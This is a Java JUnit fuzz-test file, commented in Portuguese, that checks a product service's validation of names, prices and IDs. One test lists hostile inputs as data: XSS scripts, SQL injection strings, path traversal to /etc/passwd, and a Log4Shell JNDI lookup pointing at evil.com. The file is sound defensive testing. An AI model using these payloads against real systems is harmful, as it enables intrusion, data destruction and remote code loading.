/**
 * Testes de Fuzz Testing
 * Gera dados aleatórios para explorar comportamentos inesperados
 */
package com.example.test;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.RepeatedTest;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.MethodSource;

import static org.junit.jupiter.api.Assertions.*;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import com.example.model.Produto;
import com.example.service.ProdutoService;

@DisplayName("Testes de Fuzz Testing")
public class FuzzingTest {

    private ProdutoService service;
    private Random random;

    @BeforeEach
    void setUp() {
        service = new ProdutoService();
        random = new Random();
    }

    // ===== FUZZING DE STRING - CARACTERES PERIGOSOS =====

    @ParameterizedTest
    @DisplayName("Deve rejeitar ou sanitizar strings com caracteres perigosos")
    @ValueSource(strings = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror='alert(1)'>",
        "'; DROP TABLE produtos; --",
        "1' OR '1'='1",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "\u0000null",
        "\\x00\\x01\\x02",
        "${jndi:ldap://evil.com/a}",
        "#{7*7}",
    })
    void testFuzzingStringPerigosa(String stringPerigosa) {
        Produto produto = new Produto(stringPerigosa, 100.0);
        
        try {
            Produto salvo = service.salvar(produto);
            
            // Se aceitar, deve ter sanitizado
            String nomeArmazenado = service.buscarPorId(salvo.getId()).get().getNome();
            
            // Verificar que caracteres perigosos foram removidos ou escapados
            assertFalse(nomeArmazenado.contains("<script>"), 
                "Script não deveria estar armazenado");
            assertFalse(nomeArmazenado.contains("DROP TABLE"), 
                "SQL perigoso não deveria estar armazenado");
            assertFalse(nomeArmazenado.contains("..\\"), 
                "Path traversal não deveria estar armazenado");
            
        } catch (IllegalArgumentException e) {
            // Rejeição também é aceitável
            assertNotNull(e.getMessage());
            assertTrue(e.getMessage().length() > 0);
        }
    }

    // ===== FUZZING DE STRING - EMOJIS E UNICODE =====

    @ParameterizedTest
    @DisplayName("Deve lidar com emojis e caracteres Unicode")
    @ValueSource(strings = {
        "Produto 😀😁😂🤣😃",
        "テスト商品",  // Japonês
        "产品测试",    // Chinês
        "उत्पाद परीक्षण",  // Hindi
        "🔥🚀💯✨🎉",
        "Ñoño Señor",  // Acentos
    })
    void testFuzzingUnicode(String stringUnicode) {
        Produto produto = new Produto(stringUnicode, 100.0);
        
        try {
            Produto salvo = service.salvar(produto);
            assertNotNull(salvo.getId(), "Deveria aceitar Unicode válido");
            
            Produto recuperado = service.buscarPorId(salvo.getId()).get();
            assertNotNull(recuperado.getNome(), "Nome não deveria ser nulo");
            
        } catch (IllegalArgumentException e) {
            // Aceitável se rejeitar
            System.out.println("Unicode rejeitado: " + e.getMessage());
        }
    }

    // ===== FUZZING DE STRING - TAMANHO =====

    @ParameterizedTest
    @DisplayName("Deve validar limites de tamanho de string")
    @MethodSource("gerarStringsDiferentesTamanhos")
    void testFuzzingTamanhoCadeia(String cadeia) {
        Produto produto = new Produto(cadeia, 100.0);
        
        try {
            if (cadeia.length() > 255) {
                assertThrows(IllegalArgumentException.class, 
                    () -> service.salvar(produto),
                    "Deveria rejeitar nome com mais de 255 caracteres");
            } else {
                Produto salvo = service.salvar(produto);
                assertNotNull(salvo.getId());
            }
        } catch (IllegalArgumentException e) {
            assertTrue(e.getMessage().contains("tamanho") || 
                      e.getMessage().contains("exceder") ||
                      e.getMessage().contains("limite"));
        }
    }

    /**
     * Fornece strings de diferentes tamanhos para teste
     */
    static Stream<String> gerarStringsDiferentesTamanhos() {
        return Stream.of(
            "A",                           // 1 caractere (mínimo)
            "AB",                          // 2 caracteres
            "A".repeat(100),               // 100 caracteres
            "A".repeat(255),               // 255 caracteres (limite comum)
            "A".repeat(256),               // 256 caracteres (além do limite)
            "A".repeat(1000),              // 1000 caracteres
            construirString('A', 10000)    // 10000 caracteres
        );
    }

    /**
     * Constrói uma string de caracteres repetidos
     */
    private static String construirString(char c, int tamanho) {
        char[] chars = new char[tamanho];
        for (int i = 0; i < tamanho; i++) {
            chars[i] = c;
        }
        return new String(chars);
    }

    // ===== FUZZING DE STRING - ESPAÇAMENTO =====

    @ParameterizedTest
    @DisplayName("Deve validar strings com espaçamento anormal")
    @ValueSource(strings = {
        " Produto",               // Espaço no início
        "Produto ",               // Espaço no final
        "  Produto  ",            // Espaços múltiplos
        "   ",                    // Apenas espaços
        "\t\t\t",                // Tabs
        "\n\n\n",                // Newlines
        " \t \n ",               // Misto
    })
    void testFuzzingEspacamento(String espacamento) {
        Produto produto = new Produto(espacamento, 100.0);
        
        try {
            if (espacamento.trim().isEmpty()) {
                assertThrows(IllegalArgumentException.class, 
                    () -> service.salvar(produto),
                    "Deveria rejeitar string vazia após trim");
            } else {
                Produto salvo = service.salvar(produto);
                // Nome deveria estar trimado
                String nomeArmazenado = salvo.getNome();
                assertEquals(nomeArmazenado, nomeArmazenado.trim(),
                    "Nome deveria estar trimado");
            }
        } catch (IllegalArgumentException e) {
            assertTrue(e.getMessage().contains("vazio"));
        }
    }

    // ===== FUZZING DE NÚMERO - VALORES EXTREMOS =====

    @ParameterizedTest
    @DisplayName("Deve validar preços com valores extremos")
    @ValueSource(doubles = {
        -1.0,
        -0.01,
        0.0,
        0.01,                    // Mínimo válido
        100.0,
        999999.99,
        Double.MAX_VALUE,
        Double.MIN_VALUE,
        Double.POSITIVE_INFINITY,
        Double.NEGATIVE_INFINITY,
        Double.NaN,
    })
    void testFuzzingPrecoExtremo(double precoExtremo) {
        Produto produto = new Produto("Teste", precoExtremo);
        
        try {
            if (precoExtremo <= 0 || !Double.isFinite(precoExtremo)) {
                assertThrows(IllegalArgumentException.class,
                    () -> service.salvar(produto),
                    "Deveria rejeitar preço inválido: " + precoExtremo);
            } else {
                Produto salvo = service.salvar(produto);
                assertNotNull(salvo.getId());
            }
        } catch (IllegalArgumentException e) {
            assertTrue(e.getMessage().contains("Preço"));
        }
    }

    // ===== FUZZING REPETIDO - MÚLTIPLAS OPERAÇÕES =====

    @RepeatedTest(100)
    @DisplayName("Deve lidar com 100 produtos aleatórios sem falhar")
    void testFuzzingRepetido() {
        String nomeAleatorio = gerarStringAleatoria(1, 50);
        double precoAleatorio = random.nextDouble() * 1000.0;
        
        try {
            Produto produto = new Produto(nomeAleatorio, precoAleatorio);
            
            if (precoAleatorio > 0) {
                Produto salvo = service.salvar(produto);
                assertNotNull(salvo.getId(), "Produto válido deveria ser salvo");
            } else {
                assertThrows(IllegalArgumentException.class, 
                    () -> service.salvar(produto));
            }
        } catch (IllegalArgumentException e) {
            assertNotNull(e.getMessage());
        }
    }

    @RepeatedTest(50)
    @DisplayName("Deve lidar com múltiplas operações de CRUD")
    void testFuzzingCRUDRepetido() {
        // CREATE
        Produto novo = new Produto(gerarStringAleatoria(5, 30), 
                                   random.nextDouble() * 500.0 + 1.0);
        Produto salvo = service.salvar(novo);
        assertNotNull(salvo.getId());

        // READ
        var encontrado = service.buscarPorId(salvo.getId());
        assertTrue(encontrado.isPresent());

        // UPDATE
        encontrado.get().setNome(gerarStringAleatoria(5, 30));
        Produto atualizado = service.salvar(encontrado.get());
        assertNotNull(atualizado.getId());

        // DELETE
        boolean excluido = service.excluir(salvo.getId());
        assertTrue(excluido);
    }

    // ===== FUZZING DE ID =====

    @ParameterizedTest
    @DisplayName("Deve lidar com valores aleatórios de ID")
    @ValueSource(longs = {
        -1L, 0L, 1L, 999999L, Long.MAX_VALUE, Long.MIN_VALUE
    })
    void testFuzzingIdAleatorio(long idAleatorio) {
        var resultado = service.buscarPorId(idAleatorio);
        
        // IDs inválidos não devem ser encontrados
        if (idAleatorio <= 0 || idAleatorio > 10000) {
            assertFalse(resultado.isPresent(), 
                "ID " + idAleatorio + " não deveria existir");
        }
    }

    // ===== FUZZING COM GERADOR ALEATÓRIO =====

    @RepeatedTest(50)
    @DisplayName("Deve processar strings com caracteres ASCII aleatórios")
    void testFuzzingASCIIAleatorio() {
        String stringAleatoria = gerarStringAleatoria(1, 100);
        
        try {
            Produto produto = new Produto(stringAleatoria, 50.0);
            Produto salvo = service.salvar(produto);
            assertNotNull(salvo.getId());
        } catch (IllegalArgumentException e) {
            // Aceitável se conter caracteres inválidos
            assertNotNull(e.getMessage());
        }
    }

    // ===== TESTES DE COMBINAÇÃO ALEATÓRIA =====

    @RepeatedTest(50)
    @DisplayName("Deve lidar com combinações aleatórias de nome e preço")
    void testFuzzingCombinacao() {
        String nome = gerarStringAleatoria(1, 100);
        double preco = random.nextDouble() * 10000.0 - 5000.0;  // Pode ser negativo
        
        Produto produto = new Produto(nome, preco);
        
        try {
            Produto salvo = service.salvar(produto);
            assertNotNull(salvo.getId());
            assertTrue(salvo.getPreco() > 0, "Preço deve ser positivo se salvo");
        } catch (IllegalArgumentException e) {
            assertNotNull(e.getMessage());
            assertTrue(nome.isEmpty() || nome.trim().isEmpty() || preco <= 0,
                "Deveria rejeitar dados inválidos");
        }
    }

    // ===== HELPER METHODS =====

    /**
     * Gera uma string aleatória com caracteres ASCII
     */
    private String gerarStringAleatoria(int minLength, int maxLength) {
        int length = random.nextInt(maxLength - minLength + 1) + minLength;
        return random.ints(32, 127)  // Caracteres ASCII imprimíveis (espaço até ~)
            .limit(length)
            .mapToObj(c -> String.valueOf((char) c))
            .collect(Collectors.joining());
    }

    /**
     * Gera um número aleatório com distribuição uniforme
     */
    private double gerarPrecoAleatorio() {
        return random.nextDouble() * 100000.0;
    }

    /**
     * Gera um ID aleatório
     */
    private Long gerarIdAleatorio() {
        return Math.abs(random.nextLong());
    }
}
